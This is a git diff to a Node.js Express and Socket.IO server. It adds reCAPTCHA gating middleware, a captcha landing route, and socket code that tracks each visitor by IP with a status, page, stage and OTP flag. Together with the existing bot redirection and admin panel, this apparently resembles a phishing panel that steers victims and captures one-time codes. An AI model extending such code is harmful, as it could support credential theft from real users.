@@ -125,6 +125,37 @@ const verifyAdmin = (req, res, next) => {
     
 };
 
+const checkRecaptchaSession = (req, res, next) => {
+
+    if (req.session.recaptchaVerified) {
+        next();
+    } else {
+        res.status(403).send('Access denied. Please complete the reCAPTCHA.');
+    }
+};
+
+const verifyRecaptcha = (req, res, next) => {
+    const recaptchaResponse = req.body['g-recaptcha-response'];
+
+    // Verify URL
+    const verifyUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${RECAPTCHA_SECRET_KEY}&response=${recaptchaResponse}`;
+
+    fetch(verifyUrl, { method: 'POST' })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                req.session.recaptchaVerified = true;
+
+                next(); // reCAPTCHA was successful, proceed to the next middleware/route handler
+            } else {
+                res.status(403).send('reCAPTCHA Failed: You might be a robot. Access denied.');
+            }
+        })
+        .catch(error => {
+            res.status(500).send('Error in reCAPTCHA verification, try again later.');
+        });
+};
+
 // Use this middleware in your app before your routes
 app.use(redirectBots);
 
@@ -135,6 +166,10 @@ app.use(redirectBots);
 app.use(bodyParser.json()); // for parsing application/json
 app.use(bodyParser.urlencoded({ extended: true })); // for parsing application/x-www-form-urlencoded
 app.use(express.static('public'));
+
+app.get('/', (req, res) => {
+    res.render('captcha/index')
+})
 
 app.get('/admin', (req, res) => {
     if(req.session.isAdminVerified) {
@@ -162,8 +197,20 @@ app.get('/admin/settings', checkAdminSession, (req, res) => {
 // Socket Handling
 // ====================
 io.on('connection', (socket, req) => {
+    let userIP = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
+    userIP = userIP.split(',')[0].trim();
+    
+    socket.join(userIP);
 
-    console.log('Connection !')
+    if (!sessionStore.has(userIP)) {
+        sessionStore.set(userIP, { ip: userIP, status: 'actif', page: null, stage: null, otp:false });
+    } else {
+        let userDetails = sessionStore.get(userIP);
+        userDetails.status = 'actif';
+        sessionStore.set(userIP, userDetails);
+    }
+
+    console.log(userIP)
 
 });
 
